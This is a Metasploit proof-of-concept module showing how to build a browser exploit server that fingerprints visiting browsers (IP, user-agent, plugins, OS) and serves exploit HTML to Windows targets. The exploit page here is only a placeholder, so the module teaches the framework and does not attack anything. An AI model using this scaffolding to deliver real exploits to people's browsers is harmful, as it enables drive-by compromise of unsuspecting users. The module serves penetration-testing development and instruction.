##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "IE Exploit for BrowserExploitServer Proof-of-Concept",
      'Description'    => %q{
        Here's an example of building an exploit using the BrowserExploitServer.
        This example requires the target to be exploit. If not, the mixin will
        send a fake 404 as a way to avoid engaging the target.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'URL', 'http://metasploit.com' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Payload'        =>
        {
          'BadChars'        => "\x00",  #Our spray doesn't like null bytes
          'StackAdjustment' => -3500
        },
      'Privileged'     => false,
      'DisclosureDate' => "Apr 1 2013",
      'DefaultTarget'  => 0))

    # You can see what you can see by doing this in on_request_exploit():
    # print_debug(target_info.inspect)
    requirements({
      :source  => /script|headers/i,
      :os_name => /win/i
    })
  end

  def exploit_template
    # "user_profile" is a hash that stores the following information:
    # - :ip        ; IP addressed used to connnect to the exploit
    # - :useragent ; User-Agent
    # - :plugins   ; All the plugins the browser runs
    # - :cookie    ; A unique value assigned to the user as a way to tag them.
    #profile = user_profile

    %Q|
    <% msg = "This page is generated by an exploit" %>
    <%=msg%>
    |
  end

  def on_request_exploit(cli, request, target_info)
    print_debug("I got this user: #{target_info.inspect}")
    print_status("Sending exploit HTML...")
    send_exploit_html(cli, exploit_template)
  end


  def exploit
    super
  end

end

=begin

{"rMWwSAwBHLoESpHbEGbsv"=>{:source=>"script", :os_name=>"Microsoft Windows", :os_flavor=>"XP", :ua_name=>"MSIE", :ua_ver=>"8.0", :arch=>"x86", :office=>"null", :proxy=>false, :language=>"en-us", :tried=>true}}

=end